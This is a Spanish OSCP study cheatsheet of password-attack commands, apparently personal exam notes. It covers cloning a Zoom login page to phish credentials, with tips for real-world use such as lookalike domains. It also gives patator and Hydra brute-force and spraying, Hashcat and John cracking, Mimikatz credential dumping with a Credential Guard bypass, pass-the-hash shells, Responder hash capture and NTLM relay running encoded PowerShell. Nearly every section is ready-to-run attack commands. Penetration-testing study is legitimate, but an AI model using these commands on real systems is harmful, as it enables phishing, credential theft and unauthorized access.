---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Password Attacks

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Credential Phishing (clon de web) — ver [[Website Cloning para Credential Phishing]]
```bash
# clonar la página de login (SingleFile > wget: preserva JS)
sudo apt install nodejs npm chromium -y ; sudo npm install -g single-file-cli
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
# alternativa wget (estático, puede fallar con JS externo -> alerta CSRFGuard)
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
grep -oP '.{0,100}Next</span>' signin.html          # localizar id del botón de submit
# servir el clon y capturar
sudo python3 -m http.server 80                       # sirve el clon en :80
python3 cred_server.py                               # captura POST en :8080, redirige a la web real (302)
```
Puntos clave: el `<form action>` del clon debe apuntar a `http://<KALI>:8080/creds`; en real sustituir `127.0.0.1` por la IP de Kali y usar dominio lookalike + HTTPS válido. Password managers y MFA son los principales roadblocks.

## Brute-force de login web (patator) — con CSRF token + cookie
```bash
cewl http://192.168.50.11/ -w wordlist.txt         # wordlist desde el contenido de la web
# emails.txt = usuarios encontrados (About Us, etc.)
patator http_fuzz \
    url=http://192.168.50.11/project/index.php/login \
    method=POST \
    body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1&http_referer=' \
    0=emails.txt 1=wordlist.txt \
    before_urls=http://192.168.50.11/project/index.php/login \
    before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
    accept_cookie=1 follow=0 \
    -x ignore:clen=116                              # ignora el redirect de FALLO (éxito = clen 111)
```
`before_urls`+`before_egrep` → GET previo para extraer el **CSRF token** fresco (`_TOKEN_`); `accept_cookie=1` → reenvía la cookie de sesión; distinguir éxito/fallo por **Content-Length**.

## Ataques a logins de red (Hydra) — ver [[Hydra]]
```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>           # SSH, user conocido
hydra -L names.txt -p "SuperS3cure1337#" rdp://<IP>                              # RDP spraying (1 pass)
hydra -l user -P rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
HTTP POST: `"<ruta>:<body con ^USER^/^PASS^>:<string de fallo>"` (body y mensaje de fallo → captúralos con Burp).

## Password cracking (Hashcat / John) — ver [[Password Cracking (Hashcat y John)]]
```bash
echo -n "secret1" | sha256sum                 # hashear candidato (-n = sin newline)
hashcat -b                                     # benchmark (hash rate)
python3 -c "print(62**8)"                      # keyspace = charset^longitud
hashcat --help | grep -i <algoritmo>           # buscar modo -m  (MD5=0 NTLM=1000 NetNTLMv2=5600 KeePass=13400 SSH$6$=22921)
# reglas
echo \$1 > demo.rule ; hashcat -r demo.rule --stdout demo.txt    # $x append ^x prepend ; c capitaliza
hashcat -m 0 crackme.txt rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
# formatear ficheros -> hash
keepass2john Database.kdbx > keepass.hash      # borrar "Database:" del resultado
ssh2john id_rsa > ssh.hash                      # $6$=SHA512
john --wordlist=ssh.passwords --rules=sshRules ssh.hash          # John si Hashcat da "Token length exception"
```

## Hashes de Windows: Mimikatz / PtH / Net-NTLMv2
```powershell
# Mimikatz (admin) -> ver [[Mimikatz]]
privilege::debug ; token::elevate ; lsadump::sam          # NTLM de la SAM
sekurlsa::logonpasswords                                   # creds en LSASS (incl. dominio)
misc::memssp ; type C:\Windows\System32\mimilsa.log        # bypass Credential Guard -> plaintext
```
```bash
# Pass-the-Hash -> ver [[Pass-the-Hash]]  (LMHash:NTHash -> 32 ceros + NTLM)
smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM>
impacket-psexec  -hashes 00000000000000000000000000000000:<NTLM> Administrator@<IP>   # shell SYSTEM
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM> Administrator@<IP>   # shell como user

# Net-NTLMv2: capturar + crackear / relay -> ver [[Net-NTLMv2 (Responder y Relay)]]
sudo responder -I tap0                                      # capturar (forzar: dir \\KALI\test desde el target)
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
impacket-ntlmrelayx --no-http-server -smb2support -t <IP2> -c "powershell -enc <b64>"   # relay
```

